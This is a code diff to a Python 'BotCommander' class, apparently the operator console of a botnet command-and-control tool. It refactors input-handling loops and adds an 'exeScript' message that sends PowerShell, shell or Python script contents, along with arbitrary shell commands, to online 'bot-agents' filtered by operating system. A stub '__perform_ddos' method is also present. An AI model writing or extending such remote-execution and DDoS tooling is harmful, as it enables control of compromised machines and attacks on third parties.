@@ -138,11 +138,11 @@ class BotCommander:
                 val = int(choice)
             except ValueError:
                 print("You have not inserted a digit, please insert a digit.")
-                await self.__exec_shell_cmd()
+                continue
             except Exception as err:
                 print(f"An unexpected exception occurred while processing your choice. Please retry and insert a digit."
                       f" This is the error: {err}")
-                await self.__exec_shell_cmd()
+                continue
             match val:
                 case 1:
                     cmd_filter = "Windows"
@@ -157,7 +157,7 @@ class BotCommander:
                 case _:
                     print("Please insert a digit corresponding to one of the available options, 1, 2, 3 or 4")
                     self.__print_cmd_options()
-                    await self.__exec_shell_cmd()
+                    continue
             self.__print_shell_notes()
             msg = "Do you wish to change timeout value? [Y/N]: "
             choice = await asyncio.get_running_loop().run_in_executor(None, self.__get_user_input, msg)
@@ -169,7 +169,7 @@ class BotCommander:
                         val = int(value)
                     except ValueError:
                         print("You have not inserted a digit, please insert a digit.")
-                        await self.__exec_shell_cmd()
+                        continue
                     except Exception as err:
                         print(
                             f"An unexpected exception occurred while processing your choice. Please retry"
@@ -179,12 +179,12 @@ class BotCommander:
                     pass
                 case _:
                     print("Please insert Y or N...")
-                    await self.__exec_shell_cmd()
+                    continue
             while True:
                 msg = "Please insert the command you want to send to bot-agents: "
                 cmd = await asyncio.get_running_loop().run_in_executor(None, self.__get_user_input, msg)
                 if cmd:
-                    await self.__schedule_command(cmd, cmd_filter)
+                    await self.__schedule_command("exeCommand", cmd_filter, cmd)
                     msg = "Do you wish to run another command using the same filter? Y/N: "
                     choice = await asyncio.get_running_loop().run_in_executor(None, self.__get_user_input, msg)
                     match choice:
@@ -198,10 +198,10 @@ class BotCommander:
                 else:
                     print("You need to insert something. Starting over")
                     self.__print_cmd_options()
-                    await self.__exec_shell_cmd()
+                    continue
 
-    async def __schedule_command(self, cmd, cmd_filter):
-        payload = self.__json_builder("exeCommand", cmd)
+    async def __schedule_command(self, command, cmd_filter, *args):
+        payload = self.__json_builder(command, args)
         if cmd_filter:
             for uuid in self.uuids:
                 if self.uuids[uuid].get("online") and self.uuids[uuid].get("os") == cmd_filter:
@@ -228,28 +228,35 @@ class BotCommander:
             val = self.__check_if_number(choice)
             if not val:
                 print("Please insert a number...")
-                await self.__exec_script()
+                continue
             match val:
                 case 1:
                     script_type = "powershell"
+                    cmd_filter = "Windows"
                 case 2:
                     script_type = "shell"
+                    cmd_filter = "Linux"
                 case 3:
                     script_type = "python"
+                    cmd_filter = ""
                 case 4:
                     break
                 case _:
                     print("Please insert 1, 2, 3 or 4, nothing else")
-                    await self.__exec_script()
-            await self.__schedule_script(script_type)
+                    continue
+            await self.__schedule_script(script_type, cmd_filter)
 
-    async def __schedule_script(self, script_type):
+    async def __schedule_script(self, script_type, cmd_filter):
         while True:
-            msg = "Please insert absolute path for script which you want to send to bot-agents: "
+            msg = f"NOTE: Commander will not check if the file specified by you is a valid {script_type} script.\n"\
+                  f"Please insert absolute path for the {script_type} script which you want to send to bot-agents: "
             path_to_script = await asyncio.get_running_loop().run_in_executor(None, self.__get_user_input, msg)
             if not self.__check_if_path_is_valid(path_to_script):
-                await self.__schedule_script()
-            await self.__schedule_script(script_type, path_to_script)
+                print("Inserted path is not a valid file path")
+                continue
+            with open(path_to_script, 'r') as fh:
+                data = fh.read()
+            await self.__schedule_command("exeScript", cmd_filter, data, script_type, path_to_script)
 
     def __perform_ddos(self):
         pass
@@ -419,11 +426,9 @@ class BotCommander:
         elif message == "exeCommand":
             cmd, = args
             d = {"message": f"{message}", "command": cmd, "timeout": self.cmd_tout}
-        elif message == "exePythonScript":
-            path_to_script = args
-            with open(path_to_script, 'r') as fh:
-                content = fh.read()
-            d = {"message": f"{message}", "script": path_to_script, "content": content}
+        elif message == "exeScript":
+            s_data, s_type, s_path = args
+            d = {"message": f"{message}", "script": s_path, "type": s_type, "timeout": self.cmd_tout, "content": s_data}
         else:
             logger.core.error(f"Json builder was not able to build {message}, unknown request: args: {args}")
             return False
